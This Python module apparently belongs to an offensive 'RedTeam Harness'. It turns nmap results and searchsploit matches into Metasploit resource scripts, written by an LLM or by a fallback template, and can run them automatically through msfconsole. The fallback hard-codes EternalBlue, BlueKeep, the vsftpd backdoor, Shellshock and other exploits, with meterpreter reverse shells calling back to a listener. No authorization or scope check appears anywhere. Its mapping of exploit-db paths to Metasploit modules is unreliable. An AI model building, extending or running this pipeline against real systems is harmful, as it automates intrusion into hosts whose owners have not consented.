"""
RedTeam Harness — Metasploit Script Generator (v4.0)
Parses nmap recon output, queries searchsploit for matching exploits,
uses the LLM to generate complete Metasploit resource (.rc) scripts,
validates them, and executes via msfconsole -r.

Pipeline:
  1. Parse nmap XML/text → extract (host, port, service, version)
  2. Query searchsploit for each service → match exploits
  3. LLM generates .rc script with:
     - use exploit/multi/handler for listener
     - use exploit/<path> for each target
     - set RHOSTS, LHOST, PAYLOAD
     - Auto-run options
  4. Validate .rc syntax (basic checks)
  5. Execute via msfconsole -r <script>
  6. Capture and return output
"""
import os
import re
import json
import logging
import subprocess
import time
from datetime import datetime
from typing import Dict, Any, List, Optional, Tuple

from core.injection_defense import sanitize_for_llm, sanitize_tool_output

logger = logging.getLogger("redteam.msf_generator")

# ── Output directory for generated .rc scripts ──
DEFAULT_RC_DIR = "./output/msf_scripts"


class MetasploitScriptGenerator:
    """
    Generates and executes Metasploit resource scripts from recon findings.
    """

    def __init__(self, llm=None, tools=None, config: dict = None):
        self.llm = llm
        self.tools = tools
        self.config = config or {}
        self.rc_dir = self.config.get("rc_dir", DEFAULT_RC_DIR)
        os.makedirs(self.rc_dir, exist_ok=True)

    # ═══════════════════════════════════════════════════════════════
    # 1. PARSE NMAP OUTPUT
    # ═══════════════════════════════════════════════════════════════

    def _sanitize_nmap_input(self, text: str) -> str:
        """Sanitize nmap output to prevent regex backtracking and injection."""
        if not text:
            return ""
        # Remove null bytes and control characters (keep newlines/tabs)
        text = re.sub(r'[\x00-\x08\x0b\x0c\x0e-\x1f\x7f]', '', text)
        # Truncate extremely long lines to prevent regex backtracking
        lines = text.split('\n')
        lines = [line[:10000] for line in lines]
        # Limit total input size
        if len(lines) > 50000:
            lines = lines[:50000]
        return '\n'.join(lines)

    def parse_nmap_output(self, nmap_text: str) -> List[Dict[str, Any]]:
        """
        Parse nmap stdout/text to extract service information.
        Returns list of: {host, port, protocol, service, version, banner}
        """
        nmap_text = self._sanitize_nmap_input(nmap_text)
        services = []
        current_host = None

        # Parse "Nmap scan report for <host>" lines
        host_pattern = re.compile(r"Nmap scan report for (\S+)(?:\s+\((\d+\.\d+\.\d+\.\d+)\))?")
        # Parse port lines like "80/tcp open http Apache httpd 2.4.41"
        port_pattern = re.compile(
            r"(\d+)/(tcp|udp)\s+open\s+(\S+)\s*(.*)",
            re.IGNORECASE
        )

        for line in nmap_text.split("\n"):
            line = line.strip()

            host_match = host_pattern.search(line)
            if host_match:
                current_host = host_match.group(2) or host_match.group(1)
                continue

            port_match = port_pattern.search(line)
            if port_match and current_host:
                port_num = int(port_match.group(1))
                protocol = port_match.group(2)
                service = port_match.group(3)
                version_info = port_match.group(4).strip()

                services.append({
                    "host": current_host,
                    "port": port_num,
                    "protocol": protocol,
                    "service": service,
                    "version": version_info,
                    "banner": version_info,
                })

        return services

    def parse_nmap_xml(self, xml_path: str) -> List[Dict[str, Any]]:
        """Parse nmap XML output file for richer service data."""
        try:
            import xml.etree.ElementTree as ET
            tree = ET.parse(xml_path)
            root = tree.getroot()
            services = []

            for host in root.findall(".//host"):
                addr_el = host.find("address[@addrtype='ipv4']")
                if addr_el is None:
                    addr_el = host.find("address")
                host_ip = addr_el.get("addr", "unknown") if addr_el is not None else "unknown"

                for port_el in host.findall(".//port"):
                    state_el = port_el.find("state")
                    if state_el is None or state_el.get("state") != "open":
                        continue

                    service_el = port_el.find("service")
                    service_name = ""
                    version = ""
                    product = ""
                    if service_el is not None:
                        service_name = service_el.get("name", "")
                        product = service_el.get("product", "")
                        version = service_el.get("version", "")
                        extra = service_el.get("extrainfo", "")
                        if extra:
                            version = f"{product} {version} {extra}".strip()
                        elif product:
                            version = f"{product} {version}".strip()

                    services.append({
                        "host": host_ip,
                        "port": int(port_el.get("portid", 0)),
                        "protocol": port_el.get("protocol", "tcp"),
                        "service": service_name,
                        "version": version,
                        "banner": version,
                    })

            return services
        except Exception as e:
            logger.error(f"Failed to parse nmap XML: {e}")
            return []

    # ═══════════════════════════════════════════════════════════════
    # 2. QUERY SEARCHSPLOIT
    # ═══════════════════════════════════════════════════════════════

    def query_searchsploit(self, service: str, version: str = "") -> List[Dict[str, Any]]:
        """
        Query searchsploit for exploits matching a service/version.
        Returns list of: {title, path, edb_id, description}
        """
        query = f"{service} {version}".strip()
        if not query:
            return []

        cmd = ["searchsploit", "--json", query]
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            if result.returncode != 0:
                logger.warning(f"searchsploit failed for '{query}': {result.stderr[:200]}")
                return []

            data = json.loads(result.stdout)
            exploits = []
            for item in data.get("RESULTS_EXPLOIT", []):
                exploits.append({
                    "title": item.get("Title", ""),
                    "path": item.get("Path", ""),
                    "edb_id": item.get("EDB-ID", ""),
                    "description": item.get("Description", ""),
                    "platform": item.get("Platform", ""),
                    "type": item.get("Type", ""),
                })
            return exploits[:10]  # Limit to top 10

        except json.JSONDecodeError:
            logger.warning(f"searchsploit returned non-JSON for '{query}'")
            return []
        except subprocess.TimeoutExpired:
            logger.warning(f"searchsploit timed out for '{query}'")
            return []
        except FileNotFoundError:
            logger.warning("searchsploit not found on PATH")
            return []

    def find_exploits_for_services(self, services: List[Dict]) -> List[Dict]:
        """
        For each discovered service, query searchsploit and attach matching exploits.
        Returns services enriched with 'exploits' key.
        """
        enriched = []
        for svc in services:
            exploits = self.query_searchsploit(svc["service"], svc.get("version", ""))
            svc_copy = dict(svc)
            svc_copy["exploits"] = exploits
            enriched.append(svc_copy)
        return enriched

    # ═══════════════════════════════════════════════════════════════
    # 3. GENERATE .RC SCRIPT VIA LLM
    # ═══════════════════════════════════════════════════════════════

    def generate_rc_script(self, services: List[Dict], lhost: str = "0.0.0.0",
                           lport: int = 4444, payload: str = "",
                           objective: str = "") -> str:
        """
        Use the LLM to generate a complete Metasploit .rc resource script
        based on discovered services and matching exploits.
        """
        if not self.llm:
            return self._generate_rc_fallback(services, lhost, lport, payload)

        # Build context for the LLM
        services_text = ""
        for svc in services:
            svc_line = f"- {svc['host']}:{svc['port']}/{svc['protocol']} — {svc['service']} {svc.get('version', '')}"
            if svc.get("exploits"):
                svc_line += "\n  Matching exploits:"
                for exp in svc["exploits"][:3]:
                    svc_line += f"\n    - {exp['title']} ({exp['path']})"
            services_text += svc_line + "\n"

        prompt = (
            f"You are a Metasploit expert. Generate a COMPLETE, ready-to-execute "
            f"Metasploit resource (.rc) script.\n\n"
            f"## Discovered Services & Exploits\n{sanitize_tool_output(services_text, max_len=4000)}\n"
            f"## Configuration\n"
            f"- LHOST: {sanitize_for_llm(lhost, max_len=50)}\n"
            f"- LPORT: {sanitize_for_llm(str(lport), max_len=10)}\n"
            f"- Default payload: {sanitize_for_llm(payload or 'auto-detect based on target OS', max_len=100)}\n"
            f"{'- Objective: ' + sanitize_for_llm(objective, max_len=300) if objective else ''}\n\n"
            f"## Requirements\n"
            f"1. For each service with a matching exploit, add the exploit module\n"
            f"2. Set RHOSTS, RPORT, PAYLOAD appropriately\n"
            f"3. Add a multi/handler section for reverse shells\n"
            f"4. Include 'setg' for shared options (LHOST, LPORT)\n"
            f"5. Add 'exploit -j' for background exploitation\n"
            f"6. Include comments explaining each section\n"
            f"7. Add 'spool' directive to log output\n"
            f"8. Use 'check' before 'exploit' where possible\n\n"
            f"Output ONLY the .rc script content — no markdown fences, no explanation."
        )

        try:
            messages = [{"role": "user", "content": prompt}]
            response = self.llm.chat(messages, max_tokens=4096, temperature=0.2)

            # Clean up the response — strip markdown fences if present
            rc_content = response.strip()
            if rc_content.startswith("```"):
                lines = rc_content.split("\n")
                lines = lines[1:]  # Remove opening fence
                if lines and lines[-1].strip() == "```":
                    lines = lines[:-1]
                rc_content = "\n".join(lines)

            return rc_content

        except Exception as e:
            logger.error(f"LLM .rc generation failed: {e}")
            return self._generate_rc_fallback(services, lhost, lport, payload)

    def _generate_rc_fallback(self, services: List[Dict], lhost: str,
                               lport: int, payload: str) -> str:
        """Generate a basic .rc script without LLM (fallback)."""
        lines = [
            f"# Metasploit Resource Script — Auto-generated {datetime.now().isoformat()}",
            f"# RedTeam Harness v4.0",
            "",
            "# ── Global Settings ──",
            "setg LHOST " + lhost,
            "setg LPORT " + str(lport),
            "setg VERBOSE true",
            "setg ExitOnSession false",
            "",
            "# ── Logging ──",
            f"spool {self.rc_dir}/msf_output_{int(time.time())}.log",
            "",
        ]

        # Group by service type
        exploit_map = {
            "ssh": ("exploit/linux/ssh/libssh_authbypass", "libssh"),
            "http": ("exploit/multi/http/apache_mod_cgi_bash_env_exec", "shellshock"),
            "smb": ("exploit/windows/smb/ms17_010_eternalblue", "eternalblue"),
            "ftp": ("exploit/unix/ftp/vsftpd_234_backdoor", "vsftpd"),
            "mysql": ("exploit/mysql/mysql_payload", "mysql"),
            "mssql": ("exploit/windows/mssql/mssql_payload", "mssql"),
            "rdp": ("exploit/windows/rdp/cve_2019_0708_bluekeep_rce", "bluekeep"),
        }

        for svc in services:
            service_lower = svc["service"].lower()
            host = svc["host"]
            port = svc["port"]

            lines.append(f"# ── {host}:{port} — {svc['service']} {svc.get('version', '')} ──")

            # Check if searchsploit found exploits
            if svc.get("exploits"):
                exp = svc["exploits"][0]  # Use first (most relevant) exploit
                msf_path = self._edb_to_msf_path(exp.get("path", ""))
                if msf_path:
                    lines.append(f"use {msf_path}")
                    lines.append(f"set RHOSTS {host}")
                    lines.append(f"set RPORT {port}")
                    lines.append(f"check")
                    lines.append(f"exploit -j")
                    lines.append("")
                    continue

            # Fallback to known mappings
            for svc_key, (exploit_path, name) in exploit_map.items():
                if svc_key in service_lower:
                    lines.append(f"use {exploit_path}")
                    lines.append(f"set RHOSTS {host}")
                    lines.append(f"set RPORT {port}")
                    if "windows" in exploit_path:
                        lines.append(f"set PAYLOAD windows/meterpreter/reverse_tcp")
                    else:
                        lines.append(f"set PAYLOAD linux/x64/meterpreter/reverse_tcp")
                    lines.append(f"check")
                    lines.append(f"exploit -j")
                    lines.append("")
                    break
            else:
                lines.append(f"# No known exploit — add manual testing here")
                lines.append(f"use auxiliary/scanner/portscan/tcp")
                lines.append(f"set RHOSTS {host}")
                lines.append(f"set PORTS {port}")
                lines.append(f"run")
                lines.append("")

        # Add listener at the end
        lines.extend([
            "# ── Universal Listener ──",
            "use exploit/multi/handler",
            "set PAYLOAD linux/x64/meterpreter/reverse_tcp",
            "set LHOST " + lhost,
            "set LPORT " + str(lport),
            "set ExitOnSession false",
            "exploit -j -z",
            "",
            "# ── Status ──",
            "jobs -l",
            "sessions -l",
            "",
            "# Done",
            "spool off",
        ])

        return "\n".join(lines)

    def _edb_to_msf_path(self, edb_path: str) -> Optional[str]:
        """
        Convert an EDB/exploit-db path to an msf module path.
        E.g. 'exploits/linux/remote/47887.py' → 'exploit/linux/remote/47887'
        """
        if not edb_path:
            return None
        # Remove trailing .py/.rb/.c extensions
        path = re.sub(r'\.(py|rb|c|java|php)$', '', edb_path)
        # Ensure it starts with exploit/ or auxiliary/
        if not path.startswith(("exploit/", "auxiliary/")):
            path = f"exploit/{path}"
        return path

    # ═══════════════════════════════════════════════════════════════
    # 4. VALIDATE .RC SCRIPT
    # ═══════════════════════════════════════════════════════════════

    def validate_rc_script(self, rc_content: str) -> Tuple[bool, List[str]]:
        """
        Validate .rc script for basic correctness.
        Returns (is_valid, list_of_warnings).
        """
        warnings = []
        lines = rc_content.strip().split("\n")

        if not lines:
            warnings.append("Empty .rc script")
            return False, warnings

        has_use = False
        has_handler = False
        has_rhosts = False

        for i, line in enumerate(lines):
            stripped = line.strip()
            if not stripped or stripped.startswith("#"):
                continue

            if stripped.startswith("use "):
                has_use = True
            if "exploit/multi/handler" in stripped:
                has_handler = True
            if stripped.startswith("set RHOSTS") or stripped.startswith("set RHOST "):
                has_rhosts = True

            # Check for common mistakes
            if stripped.startswith("set ") and len(stripped.split()) < 3:
                warnings.append(f"Line {i+1}: 'set' without value: {stripped}")

        if not has_use:
            warnings.append("No 'use' directive found — script may not do anything")
        if not has_handler:
            warnings.append("No multi/handler section — no listener will be started")
        if not has_rhosts:
            warnings.append("No RHOSTS set — exploits won't target any host")

        is_valid = has_use and len(warnings) == 0
        return is_valid, warnings

    # ═══════════════════════════════════════════════════════════════
    # 5. SAVE .RC SCRIPT
    # ═══════════════════════════════════════════════════════════════

    def save_rc_script(self, rc_content: str, name: str = "") -> str:
        """Save .rc script to disk. Returns the file path."""
        if not name:
            name = f"auto_exploit_{int(time.time())}"
        if not name.endswith(".rc"):
            name += ".rc"

        path = os.path.join(self.rc_dir, name)
        with open(path, "w") as f:
            f.write(rc_content)

        logger.info(f"Saved .rc script: {path}")
        return path

    # ═══════════════════════════════════════════════════════════════
    # 6. EXECUTE .RC SCRIPT VIA MSFCONSOLE
    # ═══════════════════════════════════════════════════════════════

    def execute_rc_script(self, rc_path: str, timeout: int = 600) -> Dict[str, Any]:
        """
        Execute a .rc script via msfconsole -r.
        Returns {stdout, stderr, exit_code, duration, output_file}.
        """
        if not os.path.exists(rc_path):
            return {"stdout": "", "stderr": f"RC script not found: {rc_path}",
                    "exit_code": -1, "duration": 0}

        cmd = ["msfconsole", "-q", "-r", rc_path]
        logger.info(f"Executing: {' '.join(cmd)}")

        start = time.time()
        try:
            result = subprocess.run(
                cmd, capture_output=True, text=True, timeout=timeout
            )
            duration = round(time.time() - start, 2)

            # Find the log file if spool was used
            output_file = ""
            try:
                with open(rc_path, 'r') as rc_f:
                    spool_match = re.search(r"spool\s+(.+\.log)", rc_f.read())
                if spool_match:
                    log_path = spool_match.group(1).strip()
                    if os.path.exists(log_path):
                        output_file = log_path
            except Exception:
                pass  # spool detection is best-effort

            return {
                "stdout": result.stdout[:50000],
                "stderr": result.stderr[:10000],
                "exit_code": result.returncode,
                "duration": duration,
                "output_file": output_file,
                "rc_path": rc_path,
            }

        except subprocess.TimeoutExpired:
            duration = round(time.time() - start, 2)
            return {"stdout": "", "stderr": f"msfconsole timed out after {timeout}s",
                    "exit_code": -1, "duration": duration, "rc_path": rc_path}
        except FileNotFoundError:
            return {"stdout": "", "stderr": "msfconsole not found on PATH — install Metasploit",
                    "exit_code": -1, "duration": 0, "rc_path": rc_path}
        except Exception as e:
            duration = round(time.time() - start, 2)
            return {"stdout": "", "stderr": str(e),
                    "exit_code": -1, "duration": duration, "rc_path": rc_path}

    # ═══════════════════════════════════════════════════════════════
    # FULL PIPELINE
    # ═══════════════════════════════════════════════════════════════

    def auto_exploit(self, nmap_output: str, lhost: str = "0.0.0.0",
                     lport: int = 4444, payload: str = "",
                     objective: str = "", execute: bool = False) -> Dict[str, Any]:
        """
        Full pipeline: parse nmap → find exploits → generate .rc → validate → save → optionally execute.
        """
        result = {
            "services": [],
            "exploits_found": 0,
            "rc_content": "",
            "rc_path": "",
            "validation": {},
            "execution": None,
        }

        # 1. Parse nmap
        services = self.parse_nmap_output(nmap_output)
        if not services:
            result["error"] = "No services found in nmap output"
            return result

        logger.info(f"Parsed {len(services)} services from nmap output")

        # 2. Find exploits
        services = self.find_exploits_for_services(services)
        total_exploits = sum(len(s.get("exploits", [])) for s in services)
        result["services"] = services
        result["exploits_found"] = total_exploits
        logger.info(f"Found {total_exploits} matching exploits across {len(services)} services")

        # 3. Generate .rc script
        rc_content = self.generate_rc_script(services, lhost, lport, payload, objective)
        result["rc_content"] = rc_content

        # 4. Validate
        is_valid, warnings = self.validate_rc_script(rc_content)
        result["validation"] = {"valid": is_valid, "warnings": warnings}

        # 5. Save
        rc_path = self.save_rc_script(rc_content)
        result["rc_path"] = rc_path

        # 6. Execute (if requested)
        if execute:
            exec_result = self.execute_rc_script(rc_path)
            result["execution"] = exec_result

        return result
